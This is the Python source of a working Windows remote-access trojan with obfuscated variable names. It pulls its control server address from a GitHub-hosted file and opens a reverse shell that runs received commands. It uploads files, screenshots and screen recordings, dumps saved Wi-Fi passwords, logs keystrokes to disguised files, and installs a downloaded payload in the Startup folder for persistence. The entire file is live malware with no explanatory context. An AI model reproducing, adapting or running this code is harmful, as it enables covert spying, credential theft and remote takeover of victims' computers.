import subprocess,socket,time,requests,os,logging,UZkcnLmYrgjqwhhTZSFio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
IAbXqoHHErrGxKNRWPJxu = ""
WRSeKgUrAoIzkbPgR = ""
ePdWVAqoDh = "12.12.24.0"
zPtUjGFuyionb = "!"
MldhxgWNaBxjyqaPfME = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
QupxrREbSbMgYhYxFskHisj = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def FbQGEznDPRvgyHYWNL(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def eqlZmacOGMxOasGR(s):
	AEHxnDpARTmpfkOccaWX = s.recv(1024)
	if len(AEHxnDpARTmpfkOccaWX)==0:
		return True
	HriyVTygNztJTGpOrIfbd = AEHxnDpARTmpfkOccaWX.decode("utf-8").replace("\n","")
	if not HriyVTygNztJTGpOrIfbd.startswith(zPtUjGFuyionb):
		proc = subprocess.run(HriyVTygNztJTGpOrIfbd, shell=True, capture_output=True)
		BpoxFJkDuxcpMzoQa = proc.stdout + proc.stderr
		s.send(BpoxFJkDuxcpMzoQa)
		return
	ltrmgRjmPAWr = HriyVTygNztJTGpOrIfbd.split(" ")[0][1:]
	args = " ".join(HriyVTygNztJTGpOrIfbd.split()[1:]).split()
	if ltrmgRjmPAWr == "download":
		TcKHtdgqwkuEltYnADj(s, HriyVTygNztJTGpOrIfbd)
	elif ltrmgRjmPAWr == "screenshot":
		EMgcIPpLd(s)
	elif ltrmgRjmPAWr == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif ltrmgRjmPAWr == "update":
		manualUpdate(s)
	elif ltrmgRjmPAWr == "wifi":
		getWiFiPasswords(s)
	elif ltrmgRjmPAWr == "screenrecord":
		screenRecord(s, args)
def TcKHtdgqwkuEltYnADj(s, HriyVTygNztJTGpOrIfbd):
	NSmnuJJdzQGEbtY = HriyVTygNztJTGpOrIfbd.replace(zPtUjGFuyionb+"download ","").split(",")
	BpoxFJkDuxcpMzoQas = ""
	for f in NSmnuJJdzQGEbtY:
		BpoxFJkDuxcpMzoQas += XVmFTSxXgGDmWZ(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(BpoxFJkDuxcpMzoQas, "utf-8"))
def EMgcIPpLd(s):
	UZkcnLmYrgjqwhhTZSF = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	YudamldW = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	UZkcnLmYrgjqwhhTZSF.save(YudamldW)
	UZkcnLmYrgjqwhhTZSF.close()
	r = XVmFTSxXgGDmWZ(YudamldW, "api/sscap")
	os.remove(YudamldW)
	s.send(bytes(r,"utf-8"))
def screenRecord(s, args):
	seconds = 15
	if not args == []:
		try: seconds = int(args[0])
		except: pass
	outputfile = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	frames = []
	fps = 11
	numFrames = seconds * fps
	for _ in range(numFrames):
		frames.append(ImageGrab.grab(bbox=None, all_screens=True))
	UZkcnLmYrgjqwhhTZSFio.mimsave(outputfile, frames, fps=fps, quality=8)
	XVmFTSxXgGDmWZ(outputfile, "api/file")
def XVmFTSxXgGDmWZ(KeGoRbJMkE, DDOneQtbmJM, geNqbIwBAsXixV=None):
	if not os.path.isfile(KeGoRbJMkE):
		return "[!] 404: "+KeGoRbJMkE+"\n"
	headers = {"user":os.getlogin()}
	if geNqbIwBAsXixV is not None:
		headers = {**headers, **geNqbIwBAsXixV}
	requests.post("http://"+IAbXqoHHErrGxKNRWPJxu+":5555/"+DDOneQtbmJM,
		files={"file":open(KeGoRbJMkE, "rb")},
		headers=headers)
	return "[+] 200:\n"
def manualUpdate(s):
	h, p, v = hnjMiaLKIutTfbVHEMomPt(True)
	if (v != ePdWVAqoDh):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def getWiFiPasswords(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	wifiPasswords = ""
	for p in profiles:
		try: wifiPasswords+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: wifiPasswords+=f"    {p} - N/A\n"
	s.send(wifiPasswords)
def update(MxrFOOYvKHHaWtMD):
	qpNiNMxxyXCJ = os.path.basename(__file__)
	fileType = qpNiNMxxyXCJ.split(".")[-1]
	CogqwNKoF = qpNiNMxxyXCJ.split(".")[0]+"."+MxrFOOYvKHHaWtMD+".pyw" if fileType.startswith("py") else ".exe"
	ZSonwuQeDRpMGJjYMAJj = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), CogqwNKoF)
	if not os.path.isfile(ZSonwuQeDRpMGJjYMAJj):
		with open(ZSonwuQeDRpMGJjYMAJj, "w+") as f:
			f.write(requests.get(QupxrREbSbMgYhYxFskHisj+"file."+ "pyw" if ZSonwuQeDRpMGJjYMAJj.split(".")[-1].startswith("py") else "exe").text)
def hnjMiaLKIutTfbVHEMomPt(force=False):
	global IAbXqoHHErrGxKNRWPJxu, WRSeKgUrAoIzkbPgR
	if force or IAbXqoHHErrGxKNRWPJxu == "" or WRSeKgUrAoIzkbPgR == "":
		AEHxnDpARTmpfkOccaWX = requests.get(MldhxgWNaBxjyqaPfME).text.replace("\n","").split(":")
		IAbXqoHHErrGxKNRWPJxu = AEHxnDpARTmpfkOccaWX[0].strip()
		WRSeKgUrAoIzkbPgR = AEHxnDpARTmpfkOccaWX[1].strip()
		MxrFOOYvKHHaWtMD = AEHxnDpARTmpfkOccaWX[2].strip()
	return IAbXqoHHErrGxKNRWPJxu, WRSeKgUrAoIzkbPgR, MxrFOOYvKHHaWtMD
def checkKeyLogs():
	try:
		logFileName = "settings.xpb"
		logFiles = sorted([file for file in os.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
		if logFileName in logFiles:
			logFiles.remove(logFileName)
		logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
		if len(logFiles) > 0:
			with open(logFileFullPath, "ab+") as f:
				for file in logFiles:
					temp = os.path.join(LOGGING_PATH,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		XVmFTSxXgGDmWZ(logFileFullPath, "api/log")
		if os.path.isfile(logFileFullPath):
			os.remove(logFileFullPath)
	except:
		pass
def startKeyLogging():
	logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def logKey(k):
		logging.info(str(k))
	k=Listener(on_press=logKey)
	loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in loggers:
		l.setLevel(logging.CRITICAL)
	k.start()
def RarMvHCDOLIf():
	h, p, v = hnjMiaLKIutTfbVHEMomPt()
	checkKeyLogs()
	if ePdWVAqoDh != v:
		update(v)
	startKeyLogging()
	zbkwylcEKnJFCyJDN = bytes(("(old)"if ePdWVAqoDh!=v else "")+"["+ePdWVAqoDh+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				TliwOQrWvXg=False
				try:
					s=FbQGEznDPRvgyHYWNL(h, p)
					while not TliwOQrWvXg:
						s.send(zbkwylcEKnJFCyJDN)
						TliwOQrWvXg=eqlZmacOGMxOasGR(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
RarMvHCDOLIf()
